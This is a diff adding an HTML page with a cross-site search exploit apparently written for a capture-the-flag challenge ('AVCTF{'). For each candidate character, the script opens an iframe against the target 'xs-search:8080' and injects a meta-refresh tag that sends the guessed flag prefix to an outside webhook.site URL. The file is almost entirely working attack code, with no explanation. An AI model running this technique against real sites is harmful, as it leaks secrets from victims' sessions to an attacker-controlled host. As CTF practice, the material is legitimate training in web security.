@@ -1,0 +1,30 @@
+<html>
+
+<body>
+
+</body>
+<script>
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    };
+    (async () => {
+        const charset = "01357etoanihsrdluc24689gwyfmbkvjxqz{}X_";
+        // const charset = "ABCDEFGHIJKLMNOPQRSTUVXYZA{}jxqzp01357eoanihrdl{s_cu24689gwyfmbkv{";
+        // const charset = `!"#$%&'()*+,-./:;<=>?@[\\]^_\`{|}~`
+        const results = {};
+        let i = 0;
+        let host = "xs-search:8080"
+        
+        let flag = "AVCTF{"
+        for (const char of charset) {
+            var ifrm = document.createElement("iframe");
+            ifrm.setAttribute("src", `http://${host}/?site=${flag}${char} <meta http-equiv="refresh" content="0;url=https://webhook.site/fa454134-3dac-4dc9-a336-5612714e9232?${flag}${char} " />`);
+            ifrm.style.width = "640px";
+            ifrm.style.height = "480px";
+            document.body.appendChild(ifrm);
+        }
+        console.log(results);
+    })()
+</script>
+
+</html>
